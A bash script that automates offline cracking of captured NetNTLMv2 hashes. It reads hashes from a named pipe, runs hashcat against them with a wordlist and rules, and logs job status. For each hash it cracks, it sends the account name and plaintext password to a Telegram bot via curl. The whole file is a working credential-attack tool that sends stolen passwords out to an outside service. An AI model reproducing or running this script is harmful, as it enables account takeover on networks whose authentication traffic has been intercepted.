#!/bin/bash

source settings.sh

mkdir -p cracked
mkdir -p hashes
pipe=/tmp/hashpipe

trap "rm -f $pipe" EXIT

if [[ ! -p $pipe ]]; then
    mkfifo $pipe
fi

crack() {
    hash="$1"
    name="$2"
    mode="$3"
    outfile="cracked/$name"
    infile="hashes/$name"
    time_started=$(date +%D-%T)
    job="{\"job\":\"$name\",\"wordlist\":\"$wordlist\",\"rules\":\"$rules\",\"mode\":\"$mode\", \"time_started\":\"$time_started\"}"
    echo $job | jq > status.json
    echo $job >> jobs_log.json

    echo $line >> $infile
    
    # You should load up your full list here
    echo "Starting hashcat..."
    hashcat -a 0 -m $mode $infile -o $outfile $wordlist -r $rules 
}

check_crack() {
    name="$1"
    outfile="cracked/$name"
    infile="hashes/$name"

    if [ -f $outfile ]
    then
        password=$(cat $outfile | tail -n 1 | cut -d ":" -f 7)
        echo "$name:$password Cracked successfully!!"
        curl -s -X POST -H 'Content-Type: application/json' -d "{\"chat_id\": \"$chat_id\", \"text\": \"Hash cracked successfully!: $name:$password :)\"}" https://api.telegram.org/bot$telegram_key/sendMessage
    else
        echo "$name: did not crack..."
    fi
}


while true
do
    if read line <$pipe; then
        if [[ "$hash" == 'quit' ]]; then
            break
        fi

        # This is a beautiful sexy nightmare
        name=$(echo $line | cut -d ":" -f 1-4 | tr ':' '-' | sed 's/--/-/g')
        
        crack "$hash" "$name" 5600
        check_crack "$name"

        sleep 0.5
    fi
done

echo "Autocrack exiting"

